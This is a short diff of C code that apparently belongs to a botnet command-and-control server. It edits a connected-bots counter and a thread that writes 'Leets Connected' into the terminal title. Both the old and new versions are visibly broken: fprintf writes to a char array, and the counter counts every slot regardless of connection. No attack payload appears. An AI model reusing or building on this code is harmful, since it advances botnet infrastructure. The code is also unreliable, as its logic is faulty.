@@ -14,7 +14,7 @@
 #include <pthread.h>
 #include <signal.h>
 #include <arpa/inet.h>
-#define MAXFDS 1000000
+#define MAXFDS 1
 
 struct clientdata_t {
         uint32_t ip;
@@ -24,17 +24,14 @@ struct clientdata_t {
 unsigned int BotsConnected() {
 	int i = 0, total = 0;
 	for(i = 0; i < MAXFDS; i++) {
-		clients[i].connected = 1;
 		total++;
 	}
 	return total;
 }
 int i = 0;
 void *TitleWriter(void *sock) {
-    char string[2048];
     while(1) {
-		memset(string, 0, 2048);
-        fprintf(string, "%c]0;Leets Connected: %d", '\033', BotsConnected());
+        fprintf(stderr, "%c]0;Leets Connected: %d", '\033', BotsConnected());
 		sleep(2);
 }}
 
